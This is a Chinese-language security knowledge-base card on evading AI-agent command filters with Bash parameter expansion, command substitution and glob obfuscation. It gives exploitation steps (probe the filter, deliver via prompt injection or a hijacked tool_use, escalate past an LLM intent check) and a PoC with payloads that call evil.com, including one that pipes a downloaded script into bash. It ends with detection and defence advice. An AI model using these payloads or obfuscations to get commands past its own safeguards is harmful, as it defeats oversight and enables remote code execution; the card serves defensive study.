---
id: ai-security-agent-security-bash-expansion-glob-command-filter-bypass
title: Bash 参数展开与通配符混淆绕过 Agent 命令检测：子串/正则与 Shell 解析深度差
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: bash-expansion-glob-command-filter-bypass
aliases:
- Bash 参数展开绕过
- ${c:-curl}
- 通配符 Glob 绕过
- /???/???
- 命令检测绕过
- 静态规则逃逸
- 解析深度差
tags:
- ai-security
- agent
- command-injection
- detection-bypass
- bash
- shell
- obfuscation
- glob
- expansion
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V142
  verified_at: '2026-11-06T06:25:41+08:00'
  notes: 已对照原文 40 张图逐张核对：Bash 七阶段解析、${c:-curl} 参数展开、${PATH:0:4} 切片、/???/??? 与 /????/???? glob 展开、静态规则 7/8 与 5/6 绕过、第二层 LLM 意图分析可拦截，均与卡片一致。已修正 PoC 中无效的嵌套写法 ${${a:-b}:-curl}（bash 报 bad substitution），改为 bash 实测可用的 ${a:-${b:-curl}}。未验证点：PoC 未在本机对检测器复跑；原文未标受影响版本，未设置 affected_versions；frontmatter 无 sources/source_url。
---

## 一句话结论

Agent 命令检测层如果用 Python `str.in`/正则对命令原文做子串匹配，攻击者可以用 Bash 参数展开（`${c:-curl}`）、命令替换（`$(echo c)...`）或通配符（`/???/???` → `/bin/sh`）把敏感关键字拆散或延迟到执行期展开；检测层看到的是无害字面量，Bash 执行的是完整恶意命令，形成“检测层看不懂、执行层照跑”的绕过。

## 原理

- **Bash 的解析阶段**：Bash 执行一条命令要经过词法分析 → 解析成 AST → 展开（花括号、波浪号、参数、命令替换、算术）→ 分词 → 路径展开（glob）→ 引号去除 → 执行。敏感关键字可以在展开阶段才出现。
- **检测层的浅层匹配**：`pattern.lower() in cmd.lower()` 或正则只把命令当字节序列做子串/模式匹配，不执行任何展开；它看到 `${c:-curl} -X POST http://evil.com` 时，字符串里没有连续的 `curl -X POST`，判定安全。
- **参数展开**：`${var:-default}` 在变量未定义时取默认值，`${var:+alternate}`、`${var:=assign}`、`${var:offset:length}`、`${var#pattern}`、`${var/pat/repl}`、`${!var}` 等都能把关键字拆开或动态拼出；可嵌套 `${a:-${b:-curl}}`。
- **命令替换**：`$(echo c)$(echo u)$(echo r)$(echo l)` 拼接为 `curl`；反引号同理；`$((3+3))` 算术展开可生成数字。
- **通配符 Glob**：`?` 匹配任意单字符、`*` 匹配任意多字符、`[abc]` 匹配字符集；`/???/???` 在文件系统上展开为 `/bin/sh`、`/bin/ls` 等，`/????/????` 可匹配 `/bin/bash` 等。展开发生在执行前的阶段 5，检测层不访问文件系统，无法知道最终路径。
- **计算能力差异**：子串/正则属于正则语言级别，Bash 是图灵完备解释器；用低计算能力的检测器防御高计算能力的执行器，理论上存在无限多逃逸方式。SQL 注入（正则 vs SQL 引擎）、Prompt 注入（关键词黑名单 vs 自然语言）是同类问题。
- **与 LLM 语义层的关系**：文章实测静态规则被参数展开/通配符绕过；第二层 LLM“意图-命令一致性”分析能拦截大多数此类载荷，但静态层单独存在时不可靠。

## 触发条件

- Agent 的命令检测/拦截层基于命令字符串的子串、正则或关键字黑名单，且没有先做 Shell 解析/展开。
- 攻击者能控制 Agent 执行的命令字符串（如中转站篡改 tool_use、提示注入、工具参数注入）。
- 目标环境是 Bash/sh（Bash 3.2–5.2 均支持这些标准语义），且命令最终由 shell 执行。
- 检测层没有第二层语义/意图分析，或语义层可被进一步绕过。
- 执行环境允许访问 `/bin`、`/usr/bin` 等路径，glob 才能展开到解释器。

## 利用步骤

1. 探测检测规则：先发送字面 `curl http://evil`、`/bin/sh` 等，观察是否被拦截/告警，判断匹配的是子串还是正则。
2. 用无害 `echo` 验证 Bash 展开语义：`echo ${c:-curl}`、`echo ${PATH:0:4}`、`echo /???/???`，确认目标 shell 版本支持。
3. 构造混淆载荷：`${c:-curl} -X POST http://evil.com`、`$(echo c)$(echo u)$(echo r)$(echo l) http://evil`、`/???/??? -c 'id'`。
4. 通过可控入口（中转 tool_use、提示注入、参数注入）投递；静态检测层未命中则放行。
5. Agent 执行时 Bash 展开为完整命令；用写文件/外带/DNS 等确认执行。
6. 若被 LLM 语义层拦截，尝试嵌套展开、命令替换、变量间接引用、base64 解码管道等更复杂变体，或改用其他绕过面。

## PoC

```bash
# 参数展开：检测层看不到连续的 curl
${c:-curl} -X POST http://evil.com

# 命令替换拼接
$(echo c)$(echo u)$(echo r)$(echo l) http://evil.com

# 嵌套参数展开（默认值中包含另一层展开）
${a:-${b:-curl}} http://evil.com

# 通配符：执行前展开为 /bin/sh
/???/??? -c 'id'

# 更长的解释器路径
/????/???? -c 'curl http://evil.com/c2.sh | bash'
```

```text
检测层（Python 子串匹配）：
  "${c:-curl} -X POST http://evil.com" 中找不到 "curl -x post" -> 放行
  "/???/???" 中找不到 "/bin/sh" -> 放行

Bash 执行层：
  ${c:-curl} -> curl
  /???/???   -> /bin/sh
  -> 实际执行 curl -X POST http://evil.com / /bin/sh -c 'id'
```

## 变体与关联

- **展开语法变体**：`${var:-}`、`${var:+}`、`${var:=}`、`${var:offset:length}`、`${var#}`、`${var%}`、`${var/}`、`${!var}`、`$((...))`、`$(...)`、反引号、花括号 `{a,b}`、波浪号 `~`。
- **通配符变体**：`/???/???`、`/????/????`、`/bin/??`、`/usr/bin/*sh`、字符集 `[abc]`；可结合当前工作目录的相对 glob。
- **编码变体**：`$'\x63\x75\x72\x6c'` ANSI-C 引用、base64/xxd 解码后管道给 `sh`、`printf` 构造字符串、`eval`。
- **关联**：[[ai-security-agent-security-path-denylist-quoted-variable-expansion-bypass]]（同一“字符串匹配 vs Shell 解析”原理在路径黑名单上的变体）、[[ai-security-agent-security-llm-relay-baseurl-tool-call-hijack]]（投递混淆命令的入口）、[[ai-security-agent-security-sse-chunked-smuggling-tool-detection-bypass]]（协议层让检测看不到完整命令的另一种绕过）。
- **边界**：检测层若使用 Bash AST 解析（bashlex/tree-sitter-bash）、命令白名单、沙箱 seccomp 或 LLM 语义分析，单一展开/glob 载荷可能被拦截；需要组合变体或换攻击面。

## 检测与防御

- **按解析结果检测**：用 Bash 解析器（bashlex、tree-sitter-bash）得到 AST/argv，展开变量与 glob 后再做白名单/危险参数检查；不要只对原始字符串做子串/正则。
- **命令白名单**：只允许明确的命令与参数模式；对 `sh -c`、`bash -c`、`eval`、命令替换、管道到解释器等高风险结构直接拒绝或强制人工确认。
- **第二层语义分析**：用 LLM 做“用户意图 vs 实际命令”一致性判断，作为静态规则的补充；但 LLM 也可能被更复杂的混淆欺骗，需结合 AST。
- **执行隔离**：Bash 工具运行在容器/沙箱中，限制可执行路径、网络与文件系统；高危命令强制 HITL。
- **检测信号**：命令中出现 `${...}`、`$(...)`、反引号、`$'...'`、`/???` 等展开/glob 特征；同一会话先探测字面命令再改用混淆写法；静态层放行但 Agent 执行了外连/敏感操作。
- **回归测试**：把参数展开、命令替换、glob、编码、嵌套组合加入检测器测试集；不要只测字面 payload。
